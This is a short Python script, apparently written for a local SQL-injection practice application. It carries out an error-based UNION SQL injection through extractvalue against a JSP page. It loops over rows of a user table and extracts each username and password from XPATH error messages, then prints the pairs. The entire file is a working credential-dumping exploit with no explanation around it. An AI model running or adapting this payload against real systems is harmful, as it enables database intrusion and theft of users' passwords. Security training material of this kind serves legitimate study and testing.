import requests

target = 'http://localhost:8080/SqlInjectionSamples/Story3.jsp'
attackVector1 = 'select null,null,extractvalue(0x0a,concat(0x0a,(select APP789_USER_PASSWORD ' \
               'from APP789_USER order by APP789_USER_ID limit _1_,1)))%23'
attackVector2 = 'select null,null,extractvalue(0x0a,concat(0x0a,(select APP789_USER_NAME ' \
               'from APP789_USER order by APP789_USER_ID limit _1_,1)))%23'
debug = 0

req = requests.get(target)
if req.status_code != requests.codes.ok:
    raise ValueError('Unable to connect to target')

for i in range(500):
    try:
        newTarget = target + '?q=s\' UNION ALL ' + attackVector1.replace('_1_',str(i));
        if (debug):
            print newTarget
        req1 = requests.get(newTarget)
        if(debug):
            print req.content

        newTarget = target + '?q=s\' UNION ALL ' + attackVector2.replace('_1_', str(i));
        if (debug):
            print newTarget
        req2 = requests.get(newTarget)
        if (debug):
            print req.content

        processed1 = str(req1.content).split("Exception occurred: XPATH syntax error:")[1]
        processed1 = processed1.split("\n")
        processed1 = str(processed1[1])[:-1]

        processed2 = str(req2.content).split("Exception occurred: XPATH syntax error:")[1]
        processed2 = processed2.split("\n")
        processed2 = str(processed2[1])[:-1]

        print processed2 + " > " + processed1
    except IndexError:
        break

